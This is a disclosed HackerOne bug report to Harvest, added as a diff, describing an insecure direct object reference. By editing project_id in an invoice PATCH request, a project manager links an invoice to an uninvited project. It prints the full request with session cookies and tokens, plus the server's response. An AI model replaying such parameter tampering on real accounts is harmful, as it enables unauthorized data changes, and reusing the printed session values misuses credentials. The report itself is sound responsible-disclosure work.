@@ -1,0 +1,70 @@
+ReportLink:https://hackerone.com/reports/174871
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/bugdiscloseguys
+ReportedTo:Harvest(harvest)
+BountyAmount:150.0
+Severity:low
+State:Closed
+DateOfDisclosure:12.01.2017 3:57:34
+
+Summary:
+
+Hey there,
+I found that an project manager can link his/her invoice to an project where he/she is uninvited.
+
+While linking the invoice an request is sent :
+
+```
+POST /invoices/10877569 HTTP/1.1
+Host: hshteam.harvestapp.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://hshteam.harvestapp.com/
+Cookie: _harvest_sess=WjRXQ0xiMGZ2ZlhJQStndjdVeTJVYmZ5NHFhZDd2YmNxY0MySk00Z0ltL2ZhQ3d5NGZHY1Z0RTZxUld1bU91d2ZoSnNVWEVVVi9XaTAweG00WjRyN2N4STJWYW9EdWQydkxPVFkxUWszVnVBZVZEVWd5RFFIYk5iclhPYnUyQXBKM295MmJ0MU5WYjVtWTYyREFUKzFqZmN5dGR5VDR4QUl4MnFxR0RVVGhJNTNNSm9tK0JZS1l0NXVoSlg4ekUvb3AvbTZENFBkVjNKZitTVm5XT2JWUT09LS0vWE5DWUxqSnY3cHl1M3RFZkh2QStBPT0=--eaf6f350690f1faea68ce3fc45d306ab1b72ea5e; removed_from_remarketing=true; production_access_token=RUtyVTVMdTRJRUpSMjFHaVJJQmtiWWovNit2a3ArdW5OMDQwbGN4MkE3Y29HeTZVOGQzLzF2bnNLaExPMkJxVmRDU3Y0c1BJTFhsYXE3VUJXaWlkaG5zeE4zMkdEQzhSelFJdFZ2Y0I4TUhoeUNuZFExeUIrdUcrT2lnZ2QyM0tFcXpaK2lDY2RIY1FaN0NERGczcTl3PT0tLUR1ZGg2QXpkZG92QzNrL3BaQXpLcHc9PQ==--6cf9adb8b4822020050cf45d09f76acd20ca687c; _ga=GA1.3.2127551324.1476064747; _gat_UA-103886-9=1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1184
+
+utf8=✓&_method=patch&authenticity_token=31H8s7Dz /isUnhw1JuCI8qwEeEoSwxVqKHzl6Px8HzJmsFDVAzY7/dxqyGyCJydpfZz0jmoFGlNVLJa9PnTdA==&invoice[number]=4&allow_duplicate_invoice_numbers=false&editing_invoice_id=10877569&invoice[purchase_order]=&invoice[issued_at_human_format]=10/10/2016&invoice[due_at_human_format]=upon receipt&invoice[due_at]=10/10/2016&invoice[client_id]=4900354&invoice[tax]=&invoice[tax2]=&invoice[discount]=&invoice[currency]=United States Dollar - USD&invoice[subject]=&invoice[invoice_items_attributes][1476067962062][position]=NaN&invoice[invoice_items_attributes][1476067962062][kind]=Product&invoice[invoice_items_attributes][1476067962062][description]=addas&invoice[invoice_items_attributes][1476067962062][project_id]=11933888&invoice[invoice_items_attributes][1476067962062][quantity]=1.00&invoice[invoice_items_attributes][1476067962062][unit_price]=0.00&invoice[invoice_items_attributes][1476067962062][taxed]=0&invoice[invoice_items_attributes][1476067962062][taxed2]=0&invoice[notes]=
+
+```
+
+Just Change The [project_id]=11933888  An you'll get a 302 Redirect.
+
+Response:
+
+```
+HTTP/1.1 302 Found
+Server: nginx
+Date: Mon, 10 Oct 2016 02:54:28 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Status: 302 Found
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+Cache-Control: private, no-store, no-cache, max-age=0, must-revalidate
+p3p: CP="Our privacy policy is available online: https://www.getharvest.com/services/privacy-policy"
+Content-Security-Policy-Report-Only: report-uri /csp_reports; default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.google-analytics.com *.nr-data.net ajax.googleapis.com cache.harvestapp.com js-agent.newrelic.com js.appcenter.intuit.com platform.twitter.com www.google.com www.googleadservices.com www.googletagmanager.com; style-src 'self' 'unsafe-inline' cache.harvestapp.com js.appcenter.intuit.com www.google.com
+X-App-Server: app8
+X-Robots-Tag: noindex, nofollow
+Location: https://hshteam.harvestapp.com/invoices/10877569
+X-Served-From: https://hshteam.harvestapp.com/invoices/10877569
+Set-Cookie: _harvest_sess=MDN0SWFmQjVMbTBKNS9RTDhoY2lEcVhKcFpXRkJ3MlhkOXh2OEU1Z3pTVEVYWEo3SGZMYkNqN2xEbE4vNGlid1hNNWxXcTJob0NJQVRDZHlCUUlpMGVQWXJaRitEUmdpeDZNbWpha1RkQUVWRGRaMnNFTzMycE1xNStLSGo1T3kzN2ordEEycFRRVlpGcjVFMGt3ZjlpSVRYSW9KMXNMWnB5THJIN1JtNTZyTmxMSG5CTS9pTjUrSUc1bE4xaUEyNTdrRm5aN0Z2UjN5cnIyaXN2dUI5S0JkWDliSG9HOVlkQUExTFNLM04ybE1QT2pXUmtLSkZXVEpYVnQ5MHF0YTZWdXlHbk1CcnBWbGFwZEFUQkFRUDdCZXZNNWVReXJQTWJTcGdtSVpVY2laSHdjT3BYYzF2bFRib2xUMkN3bFZPNGtZR0lROEt0aHBWeERNMUQ4b1daV3orRGRZQkVaNVNKQmJ5NzVmTE56a0thbEtaeDRVNW8wMGhxZzdsREpOL3JJUEZPYi9Ob3pHNlFaenpKV0k1VjZveVRERS9Wa2FyL1FnL3FDZThOZVF3bmtOdERiQ1RsTHM3MWNDSzg5WC0tNlJJOGVwRVBaMG1vTTlqOTJDczBmdz09--c496b2c78a2ca74dd7d0a87563c1abce8362024e; domain=.harvestapp.com; path=/; expires=Tue, 25 Oct 2016 02:54:28 -0000; secure; HttpOnly
+X-Request-Id: 9c397fe799a2f9dc3924fb1ba7eb2443
+X-Runtime: 0.070117
+Strict-Transport-Security: max-age=31536000
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Server: lb2
+Content-Length: 114
+
+<html><body>You are being <a href="https://hshteam.harvestapp.com/invoices/10877569">redirected</a>.</body></html>
+
+```
+Now You Wont be able to access that invoice :P as it's been merged :)
+
+Thanks :)
+God is great <3
